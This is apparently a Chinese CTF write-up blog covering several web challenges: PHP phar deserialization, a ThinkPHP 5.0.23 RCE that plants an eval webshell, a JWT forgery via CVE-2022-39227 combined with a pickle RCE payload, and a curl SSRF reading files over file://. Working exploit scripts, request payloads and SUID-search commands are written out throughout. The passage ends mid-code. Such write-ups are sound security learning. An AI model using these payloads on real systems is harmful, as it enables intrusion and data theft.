class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);  <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">story</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$user</span>=<span class="hljs-string">&#x27;admin&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$pass</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$eating</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$God</span>=<span class="hljs-string">&#x27;false&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;human&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>==<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">die</span>();<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-number">1</span>!=<span class="hljs-number">1</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$fffflag</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;user=<span class="hljs-string">&#x27;AshenOne&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;eating=<span class="hljs-string">&#x27;fire&#x27;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__tostring</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;user.<span class="hljs-variable language_">$this</span>-&gt;pass;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;pass==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$nothing</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;God==<span class="hljs-string">&#x27;true&#x27;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;user==<span class="hljs-string">&#x27;admin&#x27;</span>)&#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;eating);<br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Get Out!&#x27;</span>);<br>        &#125;<br>    &#125;<br>&#125;                 <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>]))&#123;<br>    <span class="hljs-comment">// $Eden=new story();</span><br>    <span class="hljs-variable">$pear</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pear&#x27;</span>];<br>    <span class="hljs-variable">$Adam</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;apple&#x27;</span>];<br>    <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$pear</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$file</span>));<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$Adam</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;多吃雪梨&#x27;</span>;<br>&#125; 多吃雪梨<br></code></pre></td></tr></table></figure><p>一堆魔术方法都是骗人的，只有<code>__destruct__</code>有用，满足条件就能任意命令执行了，接下来是传参的部分</p><p>首先要明确<code>file_get_contents(&#39;php://input&#39;)</code>可以读取POST参数，但是呢会保留<code>raw_data</code></p><p>比如说单单传入一个或多个字符是不行的，必须有<code>a=123</code>这样类似的形式，再看下一行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs file_put_contents($pear,urldecode($file))```表示将读到的数据```urldecode```之后写入以```$pear```命名的文件"><br>所以会保留```a=xxx```这样子，可以自己在本地测试下，不过这个对于做题倒是无伤大雅，因为phar只会解析有用的<br><br>看到```file_exist```很明确是```phar://```打一个phar反序列化，就是文件写入有点麻烦，而且还要绕过```__wakeup__```<br><br>浏览器抓包可以发现php版本是7.0.9，而php7.0.10就不能通过改变属性个数绕过```__wakeup__```了，所以这题还行<br><br>但是当你生成phar后再修改，那么phar的签名就无效了，必须得重新加密签名，详见下面的博客<br><br>&gt; https://www.cnblogs.com/CoLo/p/16786627.html<br><br>而且传文件得用python（我只会python，hackbar和burp全都寄，用open+read读bytes类型数据<br><br>然后用```urllib.parse.quote```将bytes数据给它url编码了，虽然说是只能传string类型，但其实可以自动转化的<br><br>POC:<br><br>```python<br>from hashlib import sha1<br>import os<br>import requests<br>import urllib.parse<br><br>urll=&#x27;http://391ffc99-a75c-4ecd-baa4-edac1b638dff.node4.buuoj.cn:81/pairing.php&#x27;<br>paramss=&#123;<br>    &#x27;pear&#x27;:&#x27;unsea.phar&#x27;,<br>    &#x27;apple&#x27;:&#x27;phar://unsea.phar&#x27;<br>&#125;<br>with open(&#x27;pharseax.phar&#x27;,&#x27;rb&#x27;) as file:<br>    f=file.read()<br>s=f[:-28]<br>h=f[-8:]<br>newf = s + sha1(s).digest() + h<br>with open(&#x27;unsea.phar&#x27;,&#x27;wb&#x27;) as file:<br>    file.write(newf)<br><br>with open(&#x27;unsea.phar&#x27;,&#x27;rb&#x27;) as fi:<br>    f=fi.read()<br>    ff=urllib.parse.quote(f)<br>    fin=requests.post(url=urll,data=ff,params=paramss)<br>    print(fin.text)<br></code></pre></td></tr></table></figure><p>——————————————————————————————————————————————————</p><h3 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h3><p>Thinkphp-V5.0.23的RCE漏洞，但是照着网上搜到的抄是无结果的，因为system被disable了</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">POST /index.php?s=captcha</span><br><span class="language-xml"></span><br><span class="language-xml">_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=1</span><br><span class="language-xml">##可以看到phpinfo里禁用了system</span><br><span class="language-xml"></span><br><span class="language-xml">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo%20&#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span>%<span class="hljs-number">20</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;%20&gt;%20/var/www/public/1.php</span><br><span class="language-xml">##写webshell，用蚁剑连接</span><br></code></pre></td></tr></table></figure><p>到根目录之后想直接<code>cat flag</code>，但是没权限，姑且先搜下SUID，但是搜出来无回显，得写到txt里再读取</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -user root -perm -4000 -print 2&gt;/dev/null &gt; 1.txt<br>cp /flag* /dev/stdout<br></code></pre></td></tr></table></figure><p>看了writeup，没懂，打算看看SUID提权</p><p>SUID（Set User ID）是给予文件一个特殊类型的权限。具体作用就是把可执行程序所有者的权限赋予可执行程序，无论执行程序的是哪位用户，可执行程序都拥有它的所有者的权限，对于root的文件权限会由rwxr变为rwsr</p><p>设置了s位的程序在运行时，其Effective UID将会设置为这个程序的所有者</p><p>这里引入了一个新的概念Effective UID。Linux进程在运行时有三个UID</p><p>Real UID 执行该进程的用户实际的UID；</p><p>Effective UID 程序实际操作时生效的UID（比如写入文件时，系统会检查这个UID是否有权限）;</p><p>Saved UID 在高权限用户降权后，保留的其原本UID（本文中不对这个UID进行深入探讨）</p><p>Real UID 执行该进程的用户实际的UID，谁通过shell运行就是谁 Effective UID 程序实际操作时生效的UID，一般在进程启动时，直接由Real UID复制而来；或者是当进程对应的可执行文件的suid标志位为s时，为该文件的所属用户&#x2F;组。所以利用suid文件进行提权需要2个前提：文件的所有者是 0 号或其他super user 文件拥有suid权限</p><p><strong>0是root用户的UID</strong></p><p>设置SUID权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">chmod u+s filename<br>chmod u-s filename # 删除SUID权限<br></code></pre></td></tr></table></figure><p>利用find命令找出linux系统上所有SUID的可执行文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">find / -perm -u=s -type f 2&gt;/dev/null<br>find / -user root -perm -4000 -print 2&gt;/dev/null<br>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br>ls -l /usr/bin<br></code></pre></td></tr></table></figure><p>分析一下<code>cp /flag* /dev/stdout</code></p><p>执行一个shell命令行时通常会自动打开三个标准文件：</p><ul><li>标准输入文件（stdin），通常对应终端的键盘；</li><li>标准输出文件（stdout）和标准错误输出文件（stderr），这两个文件都对应终端的屏幕。</li></ul><p>进程将从标准输入文件中得到输入数据，将正常输出数据输出到标准输出文件，而将错误信息送到标准错误文件中。所以stdout可以将输入的信息输出到终端上</p><p>——————————————————————————————————————————————————</p><h3 id="Ye’s-Pickle"><a href="#Ye’s-Pickle" class="headerlink" title="Ye’s Pickle"></a>Ye’s Pickle</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> jwcrypto.jwk <span class="hljs-keyword">as</span> jwk<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> python_jwt <span class="hljs-keyword">import</span> *<br>app = Flask(__name__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_string</span>(<span class="hljs-params">length=<span class="hljs-number">16</span></span>):<br>    characters = string.ascii_letters + string.digits  <span class="hljs-comment"># 包含字母和数字</span><br>    random_string = <span class="hljs-string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(length))<br>    <span class="hljs-keyword">return</span> random_string<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="hljs-number">16</span>)<br>key = jwk.JWK.generate(kty=<span class="hljs-string">&#x27;RSA&#x27;</span>, size=<span class="hljs-number">2048</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    payload=request.args.get(<span class="hljs-string">&quot;token&quot;</span>)<br>    <span class="hljs-keyword">if</span> payload:<br>        token=verify_jwt(payload, key, [<span class="hljs-string">&#x27;PS256&#x27;</span>])<br>        session[<span class="hljs-string">&quot;role&quot;</span>]=token[<span class="hljs-number">1</span>][<span class="hljs-string">&#x27;role&#x27;</span>]<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        session[<span class="hljs-string">&quot;role&quot;</span>]=<span class="hljs-string">&quot;guest&quot;</span><br>        user=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;boogipop&quot;</span>,<span class="hljs-string">&quot;role&quot;</span>:<span class="hljs-string">&quot;guest&quot;</span>&#125;<br>        jwt = generate_jwt(user, key, <span class="hljs-string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="hljs-number">60</span>))<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>,token=jwt)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/pickle&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">unser</span>():<br>    <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;role&quot;</span>]==<span class="hljs-string">&quot;admin&quot;</span>:<br>        pickle.loads(base64.b64decode(request.args.get(<span class="hljs-string">&quot;pickle&quot;</span>)))<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>上来首先是要考虑一个jwt，用了之前没见过的库<code>jwcrypto, python_jwk</code>，页面会回显token</p><p>然而，<code>SECRET_KEY和key</code>的数量级过大，实在没法强行爆破，也没有任何关于他们的信息，所以到这里就卡住了</p><p>卡了半天，无奈只能看题解，结果是个CVE，没绷住，CVE-2022-39227，参考以下博客</p><blockquote><p><a href="https://forum.butian.net/share/1990">https://forum.butian.net/share/1990</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> json <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> jwcrypto<br><span class="hljs-keyword">import</span> jwcrypto.jwk <span class="hljs-keyword">as</span> jwk<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> python_jwt <span class="hljs-keyword">import</span> *<br>key = jwk.JWK.generate(kty=<span class="hljs-string">&#x27;RSA&#x27;</span>, size=<span class="hljs-number">2048</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(key))<br><span class="hljs-built_in">print</span>(key)<br>user=&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;boogipop&quot;</span>,<span class="hljs-string">&quot;role&quot;</span>:<span class="hljs-string">&quot;guest&quot;</span>&#125;<br>jwt = generate_jwt(user, key, <span class="hljs-string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="hljs-number">60</span>))<br><span class="hljs-built_in">print</span>(jwt)<br>jwt=<span class="hljs-string">&#x27;页面回显的token&#x27;</span><br>[header, payload, signature] = jwt.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>parsed_payload = loads(base64url_decode(payload))<br><span class="hljs-built_in">print</span>(parsed_payload)<br>parsed_payload[<span class="hljs-string">&#x27;role&#x27;</span>]=<span class="hljs-string">&quot;admin&quot;</span><br>fakepayload=base64url_encode((dumps(parsed_payload, separators=(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>))))<br>fakejwt=<span class="hljs-string">&#x27;&#123;&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;.&#x27;</span> + fakepayload + <span class="hljs-string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="hljs-string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="hljs-string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="hljs-string">&#x27;&quot;&#125;&#x27;</span> <br><span class="hljs-built_in">print</span>(fakejwt)<br></code></pre></td></tr></table></figure><p>下一步就是pickle的问题，pickle嘛，是个新东西，先待我看看和整理一下</p><p>参考以下大神blog</p><blockquote><p><a href="https://goodapple.top/archives/1069">https://goodapple.top/archives/1069</a></p><p><a href="https://xz.aliyun.com/t/11807">https://xz.aliyun.com/t/11807</a></p></blockquote><p>但是这道题单纯地用什么<code>os.system(&#39;ls /&#39;)</code>肯定出不来，因为没有回显，全是模板，那么无回显该怎么办呢</p><p>参考以下博客</p><blockquote><p><a href="https://www.cnblogs.com/sijidou/p/16305695.html">https://www.cnblogs.com/sijidou/p/16305695.html</a></p></blockquote><p>所以思路是这样：</p><p>随便定义一个类，再调用它的内置方法<code>__reduce__</code>，<code>return</code>一个<code>tuple</code>类型的对象，其中<code>tuple[0]</code>是可执行的内置函数，<code>tuple[1]</code>是给函数传入的字符串方法（一般是系统命令，然后再用<code>pickle.dumps</code>序列化这个随便定义的类就行了（一般是会base64加解密的</p><p>而这里因为没有回显，但是因为<code>debug=True</code>，所以可以通过控制台报错回显（（（太妙了</p><figure class="highlight plaintext"><figcaption><span>raise Exception()```括号内内置```__import__('os').system/popen.read()```就可以了</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs exec,"><br>最终payload:<br><br>```python<br>import pickle<br>import base64<br>import os<br><br>class Jex():<br>def __reduce__(self):<br>return (exec,(&quot;raise Exception(__import__(&#x27;os&#x27;).popen(&#x27;cat /flagggggggggggg&#x27;).read())&quot;,))<br><br>def login():<br>poc = base64.b64encode(pickle.dumps(Jex()))<br>print(poc)<br>login()<br></code></pre></td></tr></table></figure><p>——————————————————————————————————————————————————</p><h3 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;hint&#x27;</span>] == [<span class="hljs-string">&quot;your?&quot;</span>, <span class="hljs-string">&quot;mine!&quot;</span>, <span class="hljs-string">&quot;hint!!&quot;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/plain&quot;</span>);<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls / -la&quot;</span>);<br>        <span class="hljs-keyword">exit</span>();<br>    &#125;<br>    <br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-variable">$ch</span> = <span class="hljs-title function_ invoke__">curl_init</span>();<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="hljs-number">60</span>);<br>        <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;lolita&#x27;</span>]);<br>        <span class="hljs-variable">$output</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$output</span>;<br>        <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>);   <br>    &#125;<span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Error</span> <span class="hljs-variable">$x</span>)&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-title function_ invoke__">highlight_string</span>(<span class="hljs-variable">$x</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>    &#125;<br><br><span class="hljs-meta">?&gt;</span> <span class="hljs-title function_ invoke__">curl_setopt</span>(): The CURLOPT_HTTPHEADER option must have an <span class="hljs-keyword">array</span> value<br></code></pre></td></tr></table></figure><p>先打一下hint，判断传入的<code>hint</code>等于一个数组，直接用<code>hint[]</code>传参就行</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://ad9e0451-31fe-4654-85e8-c9fcba3c34d8.node4.buuoj.cn:81/?hint</span>[<span class="hljs-string">0</span>]=your?&amp;hint[1]=mine!&amp;hint[2]=hint!!<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell">total 12<br>drwxr-xr-x    1 root root  51 Nov 29 10:45 .<br>drwxr-xr-x    1 root root  51 Nov 29 10:45 ..<br>-rwxr-xr-x    1 root root   0 Nov 29 10:45 .dockerenv<br>-rwxr-xr-x    1 root root 353 Oct 19 15:52 app.py<br>lrwxrwxrwx    1 root root   7 Nov 22  2021 bin -&gt; usr/bin<br>drwxr-xr-x    2 root root   6 Nov  8  2021 boot<br>drwxr-xr-x    5 root root 360 Nov 29 10:45 dev<br>drwxr-xr-x    1 root root  66 Nov 29 10:45 etc<br>-rw-------    1 root root  43 Nov 29 10:45 flag<br>drwxr-xr-x    2 root root   6 Nov  8  2021 home<br>lrwxrwxrwx    1 root root   7 Nov 22  2021 lib -&gt; usr/lib<br>lrwxrwxrwx    1 root root   9 Nov 22  2021 lib32 -&gt; usr/lib32<br>lrwxrwxrwx    1 root root   9 Nov 22  2021 lib64 -&gt; usr/lib64<br>lrwxrwxrwx    1 root root  10 Nov 22  2021 libx32 -&gt; usr/libx32<br>drwxr-xr-x    2 root root   6 Nov 22  2021 media<br>drwxr-xr-x    2 root root   6 Nov 22  2021 mnt<br>drwxr-xr-x    2 root root   6 Nov 22  2021 opt<br>dr-xr-xr-x 3994 root root   0 Nov 29 10:45 proc<br>drwx------    1 root root  20 Oct 19 15:52 root<br>drwxr-xr-x    1 root root  21 Oct 19 15:50 run<br>lrwxrwxrwx    1 root root   8 Nov 22  2021 sbin -&gt; usr/sbin<br>drwxr-xr-x    2 root root   6 Nov 22  2021 srv<br>-rwx------    1 root root 241 Oct 19 15:52 start.sh<br>dr-xr-xr-x   13 root root   0 Sep 19 01:23 sys<br>drwxrwxrwt    1 root root   6 Nov 29 10:45 tmp<br>drwxr-xr-x    1 root root  19 Nov 22  2021 usr<br>drwxr-xr-x    1 root root  17 Oct 19 15:49 var<br></code></pre></td></tr></table></figure><p>看一下<code>curl_init,curl_setopt,curl_close</code>，新东西查点资料，好像是<code>curl</code>能够爬取其他站点的内容（</p><p>那这就有点鸡肋了啊，总不至于让你请求钓鱼网站然后中病毒木马什么的吧</p><p>查了一下，可以用<code>file://</code>伪协议读，那就挺好，一看权限，好读的也就<code>app.py</code>了</p><p>但是得注意一下<code>curl_setopt($ch, CURLOPT_HTTPHEADER, $_REQUEST[&#39;lolita&#39;])</code>，传入的要是一个数组</p><p>所以又用<code>lolita[]</code>小绕一下先，先读到再说…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, session, render_template, render_template_string<br><span class="hljs-keyword">import</span> os, base64<br><span class="hljs-comment">#from NeepuF1Le import neepu_files</span><br><br>app = Flask(__name__)<br><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;******&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span 